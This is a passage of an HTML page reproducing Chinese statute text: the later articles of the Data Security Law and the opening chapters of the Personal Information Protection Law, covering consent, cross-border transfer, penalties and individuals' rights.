style="font-family: 黑体;">第十八条</span>　国家促进数据安全检测评估、认证等服务的发展，支持数据安全检测评估、认证等专业机构依法开展服务活动。</p><p style="text-indent: 2em;">国家支持有关部门、行业组织、企业、教育和科研机构、有关专业机构等在数据安全风险评估、防范、处置等方面开展协作。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十九条</span>　国家建立健全数据交易管理制度，规范数据交易行为，培育数据交易市场。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十条</span>　国家支持教育、科研机构和企业等开展数据开发利用技术和数据安全相关教育和培训，采取多种方式培养数据开发利用技术和数据安全专业人才，促进人才交流。</p><p style="text-align: center;"><span style="font-family: 黑体;">第三章　数据安全制度</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十一条</span>　国家建立数据分类分级保护制度，根据数据在经济社会发展中的重要程度，以及一旦遭到篡改、破坏、泄露或者非法获取、非法利用，对国家安全、公共利益或者个人、组织合法权益造成的危害程度，对数据实行分类分级保护。国家数据安全工作协调机制统筹协调有关部门制定重要数据目录，加强对重要数据的保护。</p><p style="text-indent: 2em;">关系国家安全、国民经济命脉、重要民生、重大公共利益等数据属于国家核心数据，实行更加严格的管理制度。</p><p style="text-indent: 2em;">各地区、各部门应当按照数据分类分级保护制度，确定本地区、本部门以及相关行业、领域的重要数据具体目录，对列入目录的数据进行重点保护。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十二条</span>　国家建立集中统一、高效权威的数据安全风险评估、报告、信息共享、监测预警机制。国家数据安全工作协调机制统筹协调有关部门加强数据安全风险信息的获取、分析、研判、预警工作。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十三条</span>　国家建立数据安全应急处置机制。发生数据安全事件，有关主管部门应当依法启动应急预案，采取相应的应急处置措施，防止危害扩大，消除安全隐患，并及时向社会发布与公众有关的警示信息。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十四条</span>　国家建立数据安全审查制度，对影响或者可能影响国家安全的数据处理活动进行国家安全审查。</p><p style="text-indent: 2em;">依法作出的安全审查决定为最终决定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十五条</span>　国家对与维护国家安全和利益、履行国际义务相关的属于管制物项的数据依法实施出口管制。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十六条</span>　任何国家或者地区在与数据和数据开发利用技术等有关的投资、贸易等方面对中华人民共和国采取歧视性的禁止、限制或者其他类似措施的，中华人民共和国可以根据实际情况对该国家或者地区对等采取措施。</p><p style="text-align: center;"><span style="font-family: 黑体;">第四章　数据安全保护义务</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十七条</span>　开展数据处理活动应当依照法律、法规的规定，建立健全全流程数据安全管理制度，组织开展数据安全教育培训，采取相应的技术措施和其他必要措施，保障数据安全。利用互联网等信息网络开展数据处理活动，应当在网络安全等级保护制度的基础上，履行上述数据安全保护义务。</p><p style="text-indent: 2em;">重要数据的处理者应当明确数据安全负责人和管理机构，落实数据安全保护责任。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十八条</span>　开展数据处理活动以及研究开发数据新技术，应当有利于促进经济社会发展，增进人民福祉，符合社会公德和伦理。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十九条</span>　开展数据处理活动应当加强风险监测，发现数据安全缺陷、漏洞等风险时，应当立即采取补救措施；发生数据安全事件时，应当立即采取处置措施，按照规定及时告知用户并向有关主管部门报告。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十条</span>　重要数据的处理者应当按照规定对其数据处理活动定期开展风险评估，并向有关主管部门报送风险评估报告。</p><p style="text-indent: 2em;">风险评估报告应当包括处理的重要数据的种类、数量，开展数据处理活动的情况，面临的数据安全风险及其应对措施等。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十一条</span>　关键信息基础设施的运营者在中华人民共和国境内运营中收集和产生的重要数据的出境安全管理，适用《中华人民共和国网络安全法》的规定；其他数据处理者在中华人民共和国境内运营中收集和产生的重要数据的出境安全管理办法，由国家网信部门会同国务院有关部门制定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十二条</span>　任何组织、个人收集数据，应当采取合法、正当的方式，不得窃取或者以其他非法方式获取数据。</p><p style="text-indent: 2em;">法律、行政法规对收集、使用数据的目的、范围有规定的，应当在法律、行政法规规定的目的和范围内收集、使用数据。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十三条</span>　从事数据交易中介服务的机构提供服务，应当要求数据提供方说明数据来源，审核交易双方的身份，并留存审核、交易记录。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十四条</span>　法律、行政法规规定提供数据处理相关服务应当取得行政许可的，服务提供者应当依法取得许可。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十五条</span>　公安机关、国家安全机关因依法维护国家安全或者侦查犯罪的需要调取数据，应当按照国家有关规定，经过严格的批准手续，依法进行，有关组织、个人应当予以配合。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十六条</span>　中华人民共和国主管机关根据有关法律和中华人民共和国缔结或者参加的国际条约、协定，或者按照平等互惠原则，处理外国司法或者执法机构关于提供数据的请求。非经中华人民共和国主管机关批准，境内的组织、个人不得向外国司法或者执法机构提供存储于中华人民共和国境内的数据。</p><p style="text-align: center;"><span style="font-family: 黑体;">第五章　政务数据安全与开放</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十七条</span>　国家大力推进电子政务建设，提高政务数据的科学性、准确性、时效性，提升运用数据服务经济社会发展的能力。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十八条</span>　国家机关为履行法定职责的需要收集、使用数据，应当在其履行法定职责的范围内依照法律、行政法规规定的条件和程序进行；对在履行职责中知悉的个人隐私、个人信息、商业秘密、保密商务信息等数据应当依法予以保密，不得泄露或者非法向他人提供。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十九条</span>　国家机关应当依照法律、行政法规的规定，建立健全数据安全管理制度，落实数据安全保护责任，保障政务数据安全。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十条</span>　国家机关委托他人建设、维护电子政务系统，存储、加工政务数据，应当经过严格的批准程序，并应当监督受托方履行相应的数据安全保护义务。受托方应当依照法律、法规的规定和合同约定履行数据安全保护义务，不得擅自留存、使用、泄露或者向他人提供政务数据。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十一条</span>　国家机关应当遵循公正、公平、便民的原则，按照规定及时、准确地公开政务数据。依法不予公开的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十二条</span>　国家制定政务数据开放目录，构建统一规范、互联互通、安全可控的政务数据开放平台，推动政务数据开放利用。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十三条</span>　法律、法规授权的具有管理公共事务职能的组织为履行法定职责开展数据处理活动，适用本章规定。</p><p style="text-align: center;"><span style="font-family: 黑体;">第六章　法律责任</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十四条</span>　有关主管部门在履行数据安全监管职责中，发现数据处理活动存在较大安全风险的，可以按照规定的权限和程序对有关组织、个人进行约谈，并要求有关组织、个人采取措施进行整改，消除隐患。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十五条</span>　开展数据处理活动的组织、个人不履行本法第二十七条、第二十九条、第三十条规定的数据安全保护义务的，由有关主管部门责令改正，给予警告，可以并处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万元以上十万元以下罚款；拒不改正或者造成大量数据泄露等严重后果的，处五十万元以上二百万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五万元以上二十万元以下罚款。</p><p style="text-indent: 2em;">违反国家核心数据管理制度，危害国家主权、安全和发展利益的，由有关主管部门处二百万元以上一千万元以下罚款，并根据情况责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照；构成犯罪的，依法追究刑事责任。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十六条</span>　违反本法第三十一条规定，向境外提供重要数据的，由有关主管部门责令改正，给予警告，可以并处十万元以上一百万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万元以上十万元以下罚款；情节严重的，处一百万元以上一千万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处十万元以上一百万元以下罚款。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十七条</span>　从事数据交易中介服务的机构未履行本法第三十三条规定的义务的，由有关主管部门责令改正，没收违法所得，处违法所得一倍以上十倍以下罚款，没有违法所得或者违法所得不足十万元的，处十万元以上一百万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照；对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十八条</span>　违反本法第三十五条规定，拒不配合数据调取的，由有关主管部门责令改正，给予警告，并处五万元以上五十万元以下罚款，对直接负责的主管人员和其他直接责任人员处一万元以上十万元以下罚款。</p><p style="text-indent: 2em;">违反本法第三十六条规定，未经主管机关批准向外国司法或者执法机构提供数据的，由有关主管部门给予警告，可以并处十万元以上一百万元以下罚款，对直接负责的主管人员和其他直接责任人员可以处一万元以上十万元以下罚款；造成严重后果的，处一百万元以上五百万元以下罚款，并可以责令暂停相关业务、停业整顿、吊销相关业务许可证或者吊销营业执照，对直接负责的主管人员和其他直接责任人员处五万元以上五十万元以下罚款。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十九条</span>　国家机关不履行本法规定的数据安全保护义务的，对直接负责的主管人员和其他直接责任人员依法给予处分。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十条</span>　履行数据安全监管职责的国家工作人员玩忽职守、滥用职权、徇私舞弊的，依法给予处分。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十一条</span>　窃取或者以其他非法方式获取数据，开展数据处理活动排除、限制竞争，或者损害个人、组织合法权益的，依照有关法律、行政法规的规定处罚。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十二条</span>　违反本法规定，给他人造成损害的，依法承担民事责任。</p><p style="text-indent: 2em;">违反本法规定，构成违反治安管理行为的，依法给予治安管理处罚；构成犯罪的，依法追究刑事责任。</p><p style="text-align: center;"><span style="font-family: 黑体;">第七章　附　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十三条</span>　开展涉及国家秘密的数据处理活动，适用《中华人民共和国保守国家秘密法》等法律、行政法规的规定。</p><p style="text-indent: 2em;">在统计、档案工作中开展数据处理活动，开展涉及个人信息的数据处理活动，还应当遵守有关法律、行政法规的规定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十四条</span>　军事数据安全保护的办法，由中央军事委员会依据本法另行制定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十五条</span>　本法自2021年9月1日起施行。</p><p><strong>原文链接：<a href="http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml">http://www.npc.gov.cn/npc/c30834/202106/7c9af12f51334a73b56d7938f99a788a.shtml</a></strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="-3"><meta name="others" content="页面生成时间 2021-08-20 21:14:27" /><meta name="template,templategroup,version" content="96f845d7fd954048bb88032c6816fc92,default,5.5" /><title></title><keyword></keyword><subtitle></subtitle><introtitle></introtitle><siteid></siteid><nodeid></nodeid><nodename></nodename><nodesearchname></nodesearchname><!--enpcontent--> <p style="text-align: center;"><span style="font-family: 黑体;">中华人民共和国个人信息保护法</span></p><p style="text-align: center;"><span style="font-family: 黑体;">（2021年8月20日第十三届全国人民代表大会常务委员会第三十次会议通过）</span></p><p style="text-align: center;"><span style="font-family: 黑体;">目　　录</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第一章　总　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第二章　个人信息处理规则</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">　　第一节　一般规定</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">　　第二节　敏感个人信息的处理规则</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">　　第三节　国家机关处理个人信息的特别规定</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第三章　个人信息跨境提供的规则</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第四章　个人在个人信息处理活动中的权利</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第五章　个人信息处理者的义务</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第六章　履行个人信息保护职责的部门</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第七章　法律责任</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;">第八章　附　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 楷体, 楷体_GB2312;"><br></span></p><p style="text-align: center;"><span style="font-family: 黑体;">第一章　总　　则</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第一条</span>　为了保护个人信息权益，规范个人信息处理活动，促进个人信息合理利用，根据宪法，制定本法。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二条</span>　自然人的个人信息受法律保护，任何组织、个人不得侵害自然人的个人信息权益。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三条</span>　在中华人民共和国境内处理自然人个人信息的活动，适用本法。</p><p style="text-indent: 2em;">在中华人民共和国境外处理中华人民共和国境内自然人个人信息的活动，有下列情形之一的，也适用本法：</p><p style="text-indent: 2em;">（一）以向境内自然人提供产品或者服务为目的；</p><p style="text-indent: 2em;">（二）分析、评估境内自然人的行为；</p><p style="text-indent: 2em;">（三）法律、行政法规规定的其他情形。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四条</span>　个人信息是以电子或者其他方式记录的与已识别或者可识别的自然人有关的各种信息，不包括匿名化处理后的信息。</p><p style="text-indent: 2em;">个人信息的处理包括个人信息的收集、存储、使用、加工、传输、提供、公开、删除等。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五条</span>　处理个人信息应当遵循合法、正当、必要和诚信原则，不得通过误导、欺诈、胁迫等方式处理个人信息。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第六条</span>　处理个人信息应当具有明确、合理的目的，并应当与处理目的直接相关，采取对个人权益影响最小的方式。</p><p style="text-indent: 2em;">收集个人信息，应当限于实现处理目的的最小范围，不得过度收集个人信息。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第七条</span>　处理个人信息应当遵循公开、透明原则，公开个人信息处理规则，明示处理的目的、方式和范围。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第八条</span>　处理个人信息应当保证个人信息的质量，避免因个人信息不准确、不完整对个人权益造成不利影响。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第九条</span>　个人信息处理者应当对其个人信息处理活动负责，并采取必要措施保障所处理的个人信息的安全。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十条</span>　任何组织、个人不得非法收集、使用、加工、传输他人个人信息，不得非法买卖、提供或者公开他人个人信息；不得从事危害国家安全、公共利益的个人信息处理活动。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十一条</span>　国家建立健全个人信息保护制度，预防和惩治侵害个人信息权益的行为，加强个人信息保护宣传教育，推动形成政府、企业、相关社会组织、公众共同参与个人信息保护的良好环境。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十二条</span>　国家积极参与个人信息保护国际规则的制定，促进个人信息保护方面的国际交流与合作，推动与其他国家、地区、国际组织之间的个人信息保护规则、标准等互认。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第二章　个人信息处理规则</span></p><p style="text-align: center;"><span style="font-family: 楷体, 楷体_GB2312;">第一节　一般规定</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十三条</span>　符合下列情形之一的，个人信息处理者方可处理个人信息：</p><p style="text-indent: 2em;">（一）取得个人的同意；</p><p style="text-indent: 2em;">（二）为订立、履行个人作为一方当事人的合同所必需，或者按照依法制定的劳动规章制度和依法签订的集体合同实施人力资源管理所必需；</p><p style="text-indent: 2em;">（三）为履行法定职责或者法定义务所必需；</p><p style="text-indent: 2em;">（四）为应对突发公共卫生事件，或者紧急情况下为保护自然人的生命健康和财产安全所必需；</p><p style="text-indent: 2em;">（五）为公共利益实施新闻报道、舆论监督等行为，在合理的范围内处理个人信息；</p><p style="text-indent: 2em;">（六）依照本法规定在合理的范围内处理个人自行公开或者其他已经合法公开的个人信息；</p><p style="text-indent: 2em;">（七）法律、行政法规规定的其他情形。</p><p style="text-indent: 2em;">依照本法其他有关规定，处理个人信息应当取得个人同意，但是有前款第二项至第七项规定情形的，不需取得个人同意。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十四条</span>　基于个人同意处理个人信息的，该同意应当由个人在充分知情的前提下自愿、明确作出。法律、行政法规规定处理个人信息应当取得个人单独同意或者书面同意的，从其规定。</p><p style="text-indent: 2em;">个人信息的处理目的、处理方式和处理的个人信息种类发生变更的，应当重新取得个人同意。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十五条</span>　基于个人同意处理个人信息的，个人有权撤回其同意。个人信息处理者应当提供便捷的撤回同意的方式。</p><p style="text-indent: 2em;">个人撤回同意，不影响撤回前基于个人同意已进行的个人信息处理活动的效力。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十六条</span>　个人信息处理者不得以个人不同意处理其个人信息或者撤回同意为由，拒绝提供产品或者服务；处理个人信息属于提供产品或者服务所必需的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十七条</span>　个人信息处理者在处理个人信息前，应当以显著方式、清晰易懂的语言真实、准确、完整地向个人告知下列事项：</p><p style="text-indent: 2em;">（一）个人信息处理者的名称或者姓名和联系方式；</p><p style="text-indent: 2em;">（二）个人信息的处理目的、处理方式，处理的个人信息种类、保存期限；</p><p style="text-indent: 2em;">（三）个人行使本法规定权利的方式和程序；</p><p style="text-indent: 2em;">（四）法律、行政法规规定应当告知的其他事项。</p><p style="text-indent: 2em;">前款规定事项发生变更的，应当将变更部分告知个人。</p><p style="text-indent: 2em;">个人信息处理者通过制定个人信息处理规则的方式告知第一款规定事项的，处理规则应当公开，并且便于查阅和保存。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十八条</span>　个人信息处理者处理个人信息，有法律、行政法规规定应当保密或者不需要告知的情形的，可以不向个人告知前条第一款规定的事项。</p><p style="text-indent: 2em;">紧急情况下为保护自然人的生命健康和财产安全无法及时向个人告知的，个人信息处理者应当在紧急情况消除后及时告知。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第十九条</span>　除法律、行政法规另有规定外，个人信息的保存期限应当为实现处理目的所必要的最短时间。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十条</span>　两个以上的个人信息处理者共同决定个人信息的处理目的和处理方式的，应当约定各自的权利和义务。但是，该约定不影响个人向其中任何一个个人信息处理者要求行使本法规定的权利。</p><p style="text-indent: 2em;">个人信息处理者共同处理个人信息，侵害个人信息权益造成损害的，应当依法承担连带责任。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十一条</span>　个人信息处理者委托处理个人信息的，应当与受托人约定委托处理的目的、期限、处理方式、个人信息的种类、保护措施以及双方的权利和义务等，并对受托人的个人信息处理活动进行监督。</p><p style="text-indent: 2em;">受托人应当按照约定处理个人信息，不得超出约定的处理目的、处理方式等处理个人信息；委托合同不生效、无效、被撤销或者终止的，受托人应当将个人信息返还个人信息处理者或者予以删除，不得保留。</p><p style="text-indent: 2em;">未经个人信息处理者同意，受托人不得转委托他人处理个人信息。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十二条</span>　个人信息处理者因合并、分立、解散、被宣告破产等原因需要转移个人信息的，应当向个人告知接收方的名称或者姓名和联系方式。接收方应当继续履行个人信息处理者的义务。接收方变更原先的处理目的、处理方式的，应当依照本法规定重新取得个人同意。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十三条</span>　个人信息处理者向其他个人信息处理者提供其处理的个人信息的，应当向个人告知接收方的名称或者姓名、联系方式、处理目的、处理方式和个人信息的种类，并取得个人的单独同意。接收方应当在上述处理目的、处理方式和个人信息的种类等范围内处理个人信息。接收方变更原先的处理目的、处理方式的，应当依照本法规定重新取得个人同意。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十四条</span>　个人信息处理者利用个人信息进行自动化决策，应当保证决策的透明度和结果公平、公正，不得对个人在交易价格等交易条件上实行不合理的差别待遇。</p><p style="text-indent: 2em;">通过自动化决策方式向个人进行信息推送、商业营销，应当同时提供不针对其个人特征的选项，或者向个人提供便捷的拒绝方式。</p><p style="text-indent: 2em;">通过自动化决策方式作出对个人权益有重大影响的决定，个人有权要求个人信息处理者予以说明，并有权拒绝个人信息处理者仅通过自动化决策的方式作出决定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十五条</span>　个人信息处理者不得公开其处理的个人信息，取得个人单独同意的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十六条</span>　在公共场所安装图像采集、个人身份识别设备，应当为维护公共安全所必需，遵守国家有关规定，并设置显著的提示标识。所收集的个人图像、身份识别信息只能用于维护公共安全的目的，不得用于其他目的；取得个人单独同意的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十七条</span>　个人信息处理者可以在合理的范围内处理个人自行公开或者其他已经合法公开的个人信息；个人明确拒绝的除外。个人信息处理者处理已公开的个人信息，对个人权益有重大影响的，应当依照本法规定取得个人同意。</p><p style="text-align: center;"><span style="font-family: 楷体, 楷体_GB2312;">第二节  敏感个人信息的处理规则</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十八条</span>　敏感个人信息是一旦泄露或者非法使用，容易导致自然人的人格尊严受到侵害或者人身、财产安全受到危害的个人信息，包括生物识别、宗教信仰、特定身份、医疗健康、金融账户、行踪轨迹等信息，以及不满十四周岁未成年人的个人信息。</p><p style="text-indent: 2em;">只有在具有特定的目的和充分的必要性，并采取严格保护措施的情形下，个人信息处理者方可处理敏感个人信息。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第二十九条</span>　处理敏感个人信息应当取得个人的单独同意；法律、行政法规规定处理敏感个人信息应当取得书面同意的，从其规定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十条</span>　个人信息处理者处理敏感个人信息的，除本法第十七条第一款规定的事项外，还应当向个人告知处理敏感个人信息的必要性以及对个人权益的影响；依照本法规定可以不向个人告知的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十一条</span>　个人信息处理者处理不满十四周岁未成年人个人信息的，应当取得未成年人的父母或者其他监护人的同意。</p><p style="text-indent: 2em;">个人信息处理者处理不满十四周岁未成年人个人信息的，应当制定专门的个人信息处理规则。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十二条</span>　法律、行政法规对处理敏感个人信息规定应当取得相关行政许可或者作出其他限制的，从其规定。</p><p style="text-align: center;"><span style="font-family: 楷体, 楷体_GB2312;">第三节　国家机关处理个人信息的特别规定</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十三条</span>　国家机关处理个人信息的活动，适用本法；本节有特别规定的，适用本节规定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十四条</span>　国家机关为履行法定职责处理个人信息，应当依照法律、行政法规规定的权限、程序进行，不得超出履行法定职责所必需的范围和限度。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十五条</span>　国家机关为履行法定职责处理个人信息，应当依照本法规定履行告知义务；有本法第十八条第一款规定的情形，或者告知将妨碍国家机关履行法定职责的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十六条</span>　国家机关处理的个人信息应当在中华人民共和国境内存储；确需向境外提供的，应当进行安全评估。安全评估可以要求有关部门提供支持与协助。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十七条</span>　法律、法规授权的具有管理公共事务职能的组织为履行法定职责处理个人信息，适用本法关于国家机关处理个人信息的规定。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第三章　个人信息跨境提供的规则</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十八条</span>　个人信息处理者因业务等需要，确需向中华人民共和国境外提供个人信息的，应当具备下列条件之一：</p><p style="text-indent: 2em;">（一）依照本法第四十条的规定通过国家网信部门组织的安全评估；</p><p style="text-indent: 2em;">（二）按照国家网信部门的规定经专业机构进行个人信息保护认证；</p><p style="text-indent: 2em;">（三）按照国家网信部门制定的标准合同与境外接收方订立合同，约定双方的权利和义务；</p><p style="text-indent: 2em;">（四）法律、行政法规或者国家网信部门规定的其他条件。</p><p style="text-indent: 2em;">中华人民共和国缔结或者参加的国际条约、协定对向中华人民共和国境外提供个人信息的条件等有规定的，可以按照其规定执行。</p><p style="text-indent: 2em;">个人信息处理者应当采取必要措施，保障境外接收方处理个人信息的活动达到本法规定的个人信息保护标准。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第三十九条</span>　个人信息处理者向中华人民共和国境外提供个人信息的，应当向个人告知境外接收方的名称或者姓名、联系方式、处理目的、处理方式、个人信息的种类以及个人向境外接收方行使本法规定权利的方式和程序等事项，并取得个人的单独同意。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十条</span>　关键信息基础设施运营者和处理个人信息达到国家网信部门规定数量的个人信息处理者，应当将在中华人民共和国境内收集和产生的个人信息存储在境内。确需向境外提供的，应当通过国家网信部门组织的安全评估；法律、行政法规和国家网信部门规定可以不进行安全评估的，从其规定。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十一条</span>　中华人民共和国主管机关根据有关法律和中华人民共和国缔结或者参加的国际条约、协定，或者按照平等互惠原则，处理外国司法或者执法机构关于提供存储于境内个人信息的请求。非经中华人民共和国主管机关批准，个人信息处理者不得向外国司法或者执法机构提供存储于中华人民共和国境内的个人信息。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十二条</span>　境外的组织、个人从事侵害中华人民共和国公民的个人信息权益，或者危害中华人民共和国国家安全、公共利益的个人信息处理活动的，国家网信部门可以将其列入限制或者禁止个人信息提供清单，予以公告，并采取限制或者禁止向其提供个人信息等措施。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十三条</span>　任何国家或者地区在个人信息保护方面对中华人民共和国采取歧视性的禁止、限制或者其他类似措施的，中华人民共和国可以根据实际情况对该国家或者地区对等采取措施。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第四章　个人在个人信息处理活动中的权利</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十四条</span>　个人对其个人信息的处理享有知情权、决定权，有权限制或者拒绝他人对其个人信息进行处理；法律、行政法规另有规定的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十五条</span>　个人有权向个人信息处理者查阅、复制其个人信息；有本法第十八条第一款、第三十五条规定情形的除外。</p><p style="text-indent: 2em;">个人请求查阅、复制其个人信息的，个人信息处理者应当及时提供。</p><p style="text-indent: 2em;">个人请求将个人信息转移至其指定的个人信息处理者，符合国家网信部门规定条件的，个人信息处理者应当提供转移的途径。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十六条</span>　个人发现其个人信息不准确或者不完整的，有权请求个人信息处理者更正、补充。</p><p style="text-indent: 2em;">个人请求更正、补充其个人信息的，个人信息处理者应当对其个人信息予以核实，并及时更正、补充。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十七条</span>　有下列情形之一的，个人信息处理者应当主动删除个人信息；个人信息处理者未删除的，个人有权请求删除：</p><p style="text-indent: 2em;">（一）处理目的已实现、无法实现或者为实现处理目的不再必要；</p><p style="text-indent: 2em;">（二）个人信息处理者停止提供产品或者服务，或者保存期限已届满；</p><p style="text-indent: 2em;">（三）个人撤回同意；</p><p style="text-indent: 2em;">（四）个人信息处理者违反法律、行政法规或者违反约定处理个人信息；</p><p style="text-indent: 2em;">（五）法律、行政法规规定的其他情形。</p><p style="text-indent: 2em;">法律、行政法规规定的保存期限未届满，或者删除个人信息从技术上难以实现的，个人信息处理者应当停止除存储和采取必要的安全保护措施之外的处理。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十八条</span>　个人有权要求个人信息处理者对其个人信息处理规则进行解释说明。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第四十九条</span>　自然人死亡的，其近亲属为了自身的合法、正当利益，可以对死者的相关个人信息行使本章规定的查阅、复制、更正、删除等权利；死者生前另有安排的除外。</p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十条</span>　个人信息处理者应当建立便捷的个人行使权利的申请受理和处理机制。拒绝个人行使权利的请求的，应当说明理由。</p><p style="text-indent: 2em;">个人信息处理者拒绝个人行使权利的请求的，个人可以依法向人民法院提起诉讼。</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: 黑体;">第五章　个人信息处理者的义务</span></p><p style="text-indent: 2em;"><span style="font-family: 黑体;">第五十一条</span>　